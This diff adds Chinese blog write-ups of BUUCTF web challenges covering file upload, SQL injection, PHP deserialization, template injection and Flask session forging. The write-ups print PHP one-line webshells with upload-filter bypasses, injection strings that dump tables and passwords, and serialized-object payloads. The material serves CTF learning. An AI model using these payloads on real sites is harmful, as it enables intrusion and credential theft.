@@ -299,6 +299,254 @@ get传参cat&amp;#x3D;do">
 <h4 id="12-极客大挑战-2019-Knife"><a href="#12-极客大挑战-2019-Knife" class="headerlink" title="12.[极客大挑战 2019]Knife"></a>12.[极客大挑战 2019]Knife</h4><p>一道水题，题目提示菜刀，蚁剑连接即可</p>
 <p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/40.png"></p>
 <p>flag在根目录。</p>
+<h4 id="13-极客大挑战-2019-Upload"><a href="#13-极客大挑战-2019-Upload" class="headerlink" title="13.[极客大挑战 2019]Upload"></a>13.[极客大挑战 2019]Upload</h4><p>文件上传题，先写个一句话木马<?php @eval($_POST['cmd']);?></p>
+<p>上传后发现<img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/42.png"></p>
+<p>将后缀改为.jpg试试</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/43.png"></p>
+<p>过滤了&lt;?，那我们只能换一种木马形式，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/101227210">https://blog.csdn.net/bylfsj/article/details/101227210</a></p>
+<p>这里我用script标签代替&lt;?。<script language="php"> eval($_POST[b]);</script></p>
+<p>后缀还是jpg，继续上传。</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/44.png"></p>
+<p>后端肯定也进行了过滤</p>
+<p>我们加一个文件头GIF89a</p>
+<p>GIF89a<script language="php"> eval($_POST[b]);</script></p>
+<p>文件头绕过</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/45.png"></p>
+<p>上传成功了，bp抓包将后缀改回php</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/46.png"></p>
+<p>NOT PHP.应该是过滤了PHP标签，换几个php标签，php3,phtml试试</p>
+<p>最后发现phtml可以使用</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/47.png"></p>
+<p>成功了，但是没显示路径，一般文件上传都放在&#x2F;upload文件夹下</p>
+<p>蚁剑连接一下<a target="_blank" rel="noopener" href="http://d46f92ab-b7c1-4b4f-a67b-4f4e8412774d.node5.buuoj.cn:81/upload/shell.phtml">http://d46f92ab-b7c1-4b4f-a67b-4f4e8412774d.node5.buuoj.cn:81/upload/shell.phtml</a></p>
+<p>密码就是一句话木马里的b。flag在根目录下</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/41.png"></p>
+<h4 id="14-ACTF2020-新生赛-Upload"><a href="#14-ACTF2020-新生赛-Upload" class="headerlink" title="14.[ACTF2020 新生赛]Upload"></a>14.[ACTF2020 新生赛]Upload</h4><p>这题和上题思路相同，用上题的一句话木马同样能上传。flag在根目录。</p>
+<h4 id="15-极客大挑战-2019-BabySQL"><a href="#15-极客大挑战-2019-BabySQL" class="headerlink" title="15.[极客大挑战 2019]BabySQL"></a>15.[极客大挑战 2019]BabySQL</h4><p>输入1’有报错，字符型注入</p>
+<p>输入-1’ union select 1,2,3#，报错了。应该是过滤了union或select，都尝试一下,发现两个都过滤了</p>
+<p>这题在判断字段时用order by也报错，过滤了or </p>
+<p>双写绕过-1’ uniunionon selselectect 1,2,3#成功回显2，3</p>
+<p>爆库：-1’ uniunionon selselectect 1,database(),3#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/48.png"></p>
+<p>爆表：-1’ uniunionon selselectect 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/49.png"></p>
+<p>通过报错判断过滤了or和from,where。还是双写绕过</p>
+<p>-1’ uniunionon selselectect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/50.png"></p>
+<p>两张表</p>
+<p>爆列：-1’ uniunionon selselectect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;’b4bsql’#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/51.png"></p>
+<p>爆字段：-1’ uniunionon selselectect 1,group_concat(id,username,passwoorrd),3 frfromom b4bsql#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/52.png"></p>
+<p>看着很乱，查看源代码即可</p>
+<h4 id="16-极客大挑战-2019-PHP"><a href="#16-极客大挑战-2019-PHP" class="headerlink" title="16.[极客大挑战 2019]PHP"></a>16.[极客大挑战 2019]PHP</h4><p>提示有备份文件，dirsearch扫目录发现<a target="_blank" rel="noopener" href="http://www.zip的文件.访问一下直接下载下来/">www.zip的文件。访问一下直接下载下来</a></p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/53.png"></p>
+<p>flag.php里是假flag</p>
+<p>我们看index.php</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/54.png"></p>
+<p>包含class.php，get传参select，然后进行反序列化</p>
+<p>看class.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Name&#123;</span><br><span class="line">  private $username = &#x27;nonono&#x27;;</span><br><span class="line">  private $password = &#x27;yesyes&#x27;;</span><br><span class="line">  public function __construct($username,$password)&#123;</span><br><span class="line">​    $this-&gt;username = $username;</span><br><span class="line">​    $this-&gt;password = $password;</span><br><span class="line">  &#125;</span><br><span class="line">  function __wakeup()&#123;</span><br><span class="line">​    $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  function __destruct()&#123;</span><br><span class="line">​    if ($this-&gt;password != 100) &#123;</span><br><span class="line">​      echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">​      echo &quot;You name is: &quot;;</span><br><span class="line">​      echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">​      echo &quot;You password is: &quot;;</span><br><span class="line">​      echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">​      die();</span><br><span class="line">​    &#125;</span><br><span class="line">​    if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">​      global $flag;</span><br><span class="line">​      echo $flag;</span><br><span class="line">​    &#125;else&#123;</span><br><span class="line">​      echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">​      die();</span><br><span class="line">​    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简单的反序列化。要得到flag，password必须是100，username必须是admin。直接赋值就行了</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/55.png"></p>
+<p>绕过__wakeup函数只要成员属性数目大于实际数目即可，两个成员，我们只要将2改成3即可</p>
+<p>注意还有url编码一下最终payload为：</p>
+<p>?select&#x3D;</p>
+<p>O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</p>
+<h4 id="17-ACTF2020-新生赛-BackupFile"><a href="#17-ACTF2020-新生赛-BackupFile" class="headerlink" title="17.[ACTF2020 新生赛]BackupFile"></a>17.[ACTF2020 新生赛]BackupFile</h4><p>题目名字提示后门文件</p>
+<p>dirsearch扫描一下</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/56.png"></p>
+<p>访问一下，将备份文件下载下来</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/57.png"></p>
+<p>两个等号&#x3D;&#x3D;，php弱类型相等</p>
+<p>只要传参key&#x3D;123就行了</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/58.png"></p>
+<h4 id="18-RoarCTF-2019-Easy-Calc"><a href="#18-RoarCTF-2019-Easy-Calc" class="headerlink" title="18.[RoarCTF 2019]Easy Calc"></a>18.[RoarCTF 2019]Easy Calc</h4><p>打开页面是个计算器，查看源代码</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/59.png"></p>
+<p>发现calc.php，访问一下</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/60.png"></p>
+<p>当我们传入字母时总会报错</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/61.png"></p>
+<p>只能传入数字，看了大佬们的wp，说是这题只能传数字不能传字母</p>
+<p>那么我们要绕过num传参，可以利用php解析字符串的特性</p>
+<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符（空格，+等）转换为下划线（包括空格）。这样绕过了waf，但是php依然能执行。</p>
+<p>这题后台还加了过滤。</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/62.png"></p>
+<p>发现system被禁了。我们可以使用var_dump来输出</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/63.png"></p>
+<p>过滤了&#x2F;，我们用chr()函数，将ascii码值转化成字符串，这里&#x2F;使用chr(47)来代替，注意chr()函数已经转成了字符串，所以不需要多加引号了。</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/64.png"></p>
+<p>这里scandir是列出指定路径下的文件或目录，然后var_dump输出，发现f1agg，应该是flag所在文件了</p>
+<p>还是利用chr()函数进行拼接。然后用file_get_contents()来读取文件内容，然后var_dump输出</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/65.png"></p>
+<h4 id="19-极客大挑战-2019-BuyFlag"><a href="#19-极客大挑战-2019-BuyFlag" class="headerlink" title="19.[极客大挑战 2019]BuyFlag"></a>19.[极客大挑战 2019]BuyFlag</h4><p>查看源代码，有个pay.php</p>
+<p>进去后，说要满足两个条件，是cuit学生，password正确，才能购买</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/66.png"></p>
+<p>抓包看一下</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/67.png"></p>
+<p>提示password，可以用php的弱相等来绕过，注意cookie：user&#x3D;0</p>
+<p>这里cookie应该是记录身份的，将其改为1</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/68.png"></p>
+<p>已经满足一个条件是cuiter了，接下来输入password</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/69.png"></p>
+<p>满足条件了。可以买flag了，接下来应该要付钱了</p>
+<p>这里对money的长度进行限制了，我们用科学计数法，拿下flag</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/70.png"></p>
+<h4 id="20-BJDCTF2020-Easy-MD5"><a href="#20-BJDCTF2020-Easy-MD5" class="headerlink" title="20.[BJDCTF2020]Easy MD5"></a>20.[BJDCTF2020]Easy MD5</h4><p>进去后随便输入，没什么反应，抓包看一下</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/71.png"></p>
+<p>给了暗示。md5($pass,true)</p>
+<p>这就要用我们的md5万能字符串:ffifdyop了</p>
+<p>具体原理可以查看佬：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/122747034">https://blog.csdn.net/xhy18634297976/article/details/122747034</a></p>
+<p>进入第二关：</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/72.png"></p>
+<p>直接数组传参?a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<p>进入第三关：</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/73.png"></p>
+<p>依旧可以用数组绕过</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/74.png"></p>
+<p>拿到flag。</p>
+<h4 id="21-HCTF-2018-admin"><a href="#21-HCTF-2018-admin" class="headerlink" title="21.[HCTF 2018]admin"></a>21.[HCTF 2018]admin</h4><p>进去看源码: you are not admin</p>
+<p>要用admin身份进入，于是在登录界面输入admin，密码123结果直接登录进去了。。。。</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/75.png"></p>
+<p>应该是非预期了。。我们看一下正常思路的解法：</p>
+<p>session伪造</p>
+<p>随便注册账号登录进去，在改密码页面查看源代码</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/76.png"></p>
+<p>去github上下载，目前已经下架了。</p>
+<p>看其他wp，加密密钥在config.py里，为cjk123</p>
+<p>我们先将自己的session解密</p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line">    </span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line">    </span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))   </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/77.png"></p>
+<p>然后将name修改为admin进行session加密</p>
+<p>加密脚本git下载:   git clone <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<p>运行后得到</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/78.png"></p>
+<p>将session进行伪造后即可</p>
+<h4 id="22-MRCTF2020-你传你🐎呢"><a href="#22-MRCTF2020-你传你🐎呢" class="headerlink" title="22.[MRCTF2020]你传你🐎呢"></a>22.[MRCTF2020]你传你🐎呢</h4><p>文件上传，先写个一句话木马上传</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/79.png"></p>
+<p>过滤了。将后缀改为jpg试试。上传成功了并且返回了文件路径</p>
+<p>那么我们可以就先上传应该shell，然后该content-type为jpg</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/80.png"></p>
+<p>上传成功了，记住文件路径。</p>
+<p>此时在上传一个.htaccess文件，使其将shell文件解析成php语句</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/81.png"></p>
+<p>这里也要把content-type改为image&#x2F;jpeg</p>
+<p>文件内容的意思是把叫shell的文件解析成php文件。此时用蚁剑连接之前上传shell的路径即可</p>
+<p>flag在根目录。</p>
+<h4 id="23-护网杯-2018-easy-tornado"><a href="#23-护网杯-2018-easy-tornado" class="headerlink" title="23.[护网杯 2018]easy_tornado"></a>23.[护网杯 2018]easy_tornado</h4><p>进去发现三个文件。第一个提示flag所在位置。第二个是render,第三个是告诉加密方式</p>
+<p>看url可知，我们要把filename传入&#x2F;fllllllllllllag，把filehash传入加密后的值。</p>
+<p>难点是<img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/82.png"></p>
+<p>cookie_secret怎么找呢。看了大佬们的wp，第二条提示很关键，render是python的一个模板</p>
+<p>自然而然想到模板注入</p>
+<p>随意修改一个filename的值，页面就会报错，并且url会变为：</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/83.png"></p>
+<p>尝试传参msg&#x3D;2，页面回显ORZ</p>
+<p>这样大胆确定确实是模板注入,继续传参msg&#x3D;</p>
+<p>可以看到环境变量：</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/84.png"></p>
+<p>cookie_secret得了，接下来只要按照加密方式加密就行了</p>
+<p>最终payload：file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;2fbd47a96ad73eeeeb7df4baf01036eb</p>
+<h4 id="24-ZJCTF-2019-NiZhuanSiWei"><a href="#24-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="24.[ZJCTF 2019]NiZhuanSiWei"></a>24.[ZJCTF 2019]NiZhuanSiWei</h4><p>进去进行代码审计：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">     <span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>]; </span><br><span class="line">     <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">     <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>]; </span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;                               <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;     </span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;     </span><br><span class="line">          <span class="keyword">exit</span>();   &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;     </span><br><span class="line">          <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//useless.php     </span></span><br><span class="line">          <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);     </span><br><span class="line">          <span class="keyword">echo</span> <span class="variable">$password</span>;   &#125; &#125; </span><br><span class="line">   <span class="keyword">else</span>&#123;   </span><br><span class="line">       <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">   &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>一共3个变量，</p>
+<p>第一个要满足(file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”welcome to the zjctf”)</p>
+<p>file_get_contents函数：把文件内容读取到字符串中，这里用php伪协议：data:&#x2F;&#x2F;text&#x2F;plain,内容</p>
+<p>传参?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
+<p>意思是将welcome to the zjctf通过data协议写入一个文件中，然后file_get_contents读取该文件内容，第一个变量就过了。</p>
+<p>第二个提示useless.php，并且用到了include文件包含函数，php伪协议读取一下file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/85.png"></p>
+<p>拿去base64解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>简单的反序列化，将file赋值为flag.php即可<img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/86.png"></p>
+<p>最终payload：</p>
+<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
+<p>注意不要再读取useless.php了。只要包含这个文件使其能进行反序列化输出即可。</p>
+<p>flag在源代码里</p>
+<h4 id="25-极客大挑战-2019-HardSQL"><a href="#25-极客大挑战-2019-HardSQL" class="headerlink" title="25.[极客大挑战 2019]HardSQL"></a>25.[极客大挑战 2019]HardSQL</h4><p>进去输入1’ or 1&#x3D;1#，发现被过滤了，过滤了空格。继续尝试其他的，发现union也被过滤了。这下联合查询注入无法使用了。试试报错注入。空格可以用&#x2F;**&#x2F;和()过滤，但是这里前者被过滤了，只能用括号过滤了</p>
+<p>原理见<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51652864/article/details/115740086%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%8D%9A%E5%AE%A2">https://blog.csdn.net/qq_51652864/article/details/115740086大佬的博客</a></p>
+<p>利用报错注入查库： 1’or(extractvalue(1,concat(‘~’,(database()))))#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/87.png"></p>
+<p>&#x3D;号被禁了，我们用like绕过</p>
+<p>查表：1’or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())))))#<img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/88.png"></p>
+<p>拿到H4rDsq1表</p>
+<p>爆列：1’or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’)))))#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/89.png"></p>
+<p>爆数据：1’or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)))))#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/90.png"></p>
+<p>只有一部分，因为extractvalue函数只能拿到前32位</p>
+<p>我们可以用right函数截取右边的flag部分</p>
+<p>1’or(extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)))))#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/91.png"></p>
+<h4 id="26-MRCTF2020-Ez-bypass"><a href="#26-MRCTF2020-Ez-bypass" class="headerlink" title="26.[MRCTF2020]Ez_bypass"></a>26.[MRCTF2020]Ez_bypass</h4><p>简单的代码审计</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one 